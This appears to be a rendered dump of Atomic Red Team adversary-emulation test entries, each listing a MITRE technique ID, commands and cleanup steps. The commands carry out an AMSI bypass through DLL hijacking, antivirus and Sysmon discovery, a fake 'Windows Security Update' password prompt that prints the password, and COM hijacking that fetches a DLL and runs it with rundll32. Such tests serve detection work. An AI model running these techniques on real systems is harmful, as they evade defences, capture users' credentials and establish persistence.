<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3</li>
<li><strong>name</strong>: DLL Search Order Hijacking - amsi.dll</li>
<li><strong>description</strong>: Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/</li>
</ul>
<p>Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
%APPDATA%\updater.exe -Command exit</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: del %APPDATA%\updater.exe &gt;nul 2&gt;&amp;1
del %APPDATA%\amsi.dll &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1574.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f92a380f-ced9-491f-b338-95a991418ce2</li>
<li><strong>name</strong>: Security Software Discovery</li>
<li><strong>description</strong>: Methods to identify Security Software on an endpoint</li>
</ul>
<p>when sucessfully executed, the test is going to display running processes, firewall configuration on network profiles
and specific security software.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: netsh.exe advfirewall  show allprofiles 
netsh.exe advfirewall firewall dump
netsh.exe advfirewall show currentprofile
netsh.exe advfirewall firewall show rule name=all
netsh.exe firewall show state
netsh.exe firewall show config
sc query windefend
powershell.exe /c "Get-Process | Where-Object { $<em>.ProcessName -eq 'Sysmon' }"
powershell.exe /c "Get-Service | where-object {$</em>.DisplayName -like '<em>sysm</em>'}"
powershell.exe /c "Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''"
tasklist.exe
tasklist.exe | findstr /i virus
tasklist.exe | findstr /i cb
tasklist.exe | findstr /i defender
tasklist.exe | findstr /i cylance
tasklist.exe | findstr /i mc
tasklist.exe | findstr /i "virus cb defender cylance mc"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1518.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7f566051-f033-49fb-89de-b6bacab730f0</li>
<li><strong>name</strong>: Security Software Discovery - powershell</li>
<li><strong>description</strong>: Methods to identify Security Software on an endpoint</li>
</ul>
<p>when sucessfully executed, powershell is going to processes related AV products if they are running.
Note that, depending on the privilege of current user, get-process | ?{$_.Description -like "<em>"} may not return the processes related to AV products of the check.
For instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like "</em>"},
if you know the name of those processes.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: get-process | ?{$<em>.Description -like "<em>virus</em>"}
get-process | ?{$</em>.Description -like "<em>carbonblack</em>"}
get-process | ?{$<em>.Description -like "<em>defender</em>"}
get-process | ?{$</em>.Description -like "<em>cylance</em>"}
get-process | ?{$<em>.Description -like "<em>mc</em>"}
get-process | ?{$</em>.ProcessName -like "<em>mc</em>"}
get-process | Where-Object { $_.ProcessName -eq "Sysmon" }</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1518.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 015cd268-996e-4c32-8347-94c80c6286ee</li>
<li><strong>name</strong>: Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets</li>
<li><strong>description</strong>: Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.</li>
</ul>
<p>when sucessfully executed, information about installed AV software is displayed..</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct
powershell Get-WmiObject -Namespace root\securitycenter2 -Class antivirusproduct</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1518.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2b162bfd-0928-4d4c-9ec3-4d9f88374b52</li>
<li><strong>name</strong>: PowerShell - Prompt User for Password</li>
<li><strong>description</strong>: Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.</li>
</ul>
<p>Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: # Creates GUI to prompt for password. Expect long pause before prompt is available.  <br />
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)</li>
</ul>
<h1>Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.</h1>
<p>write-warning $cred.GetNetworkCredential().Password</p>
<ul>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1056.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 48117158-d7be-441b-bc6a-d9e36e47b52b</li>
<li><strong>name</strong>: COM Hijacking - InprocServer32</li>
<li><strong>description</strong>: This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.</li>
</ul>
<p>Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
- <strong>platforms</strong>: ['windows']
- <strong>command</strong>: New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}\InprocServer32' -Value "#{dllpath}"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
- <strong>prereq_command</strong>: if (Test-Path "#{dllpath}") {exit 0} else {exit 1}
- <strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll" -OutFile "#{dllpath}"</p>
<ul>
<li><strong>cleanup_command</strong>: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}' -Recurse -ErrorAction Ignore</li>
<li><strong>mitre_id</strong>: T1546.015</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 752191b1-7c71-445c-9dbe-21bb031b18eb</li>
<li><strong>name</strong>: Powershell Execute COM Object</li>
<li><strong>description</strong>: Use the PowerShell to execute COM CLSID object.
Reference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
$item = $o.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Get-Process -Name "*calc" | Stop-Process</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1546.015</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
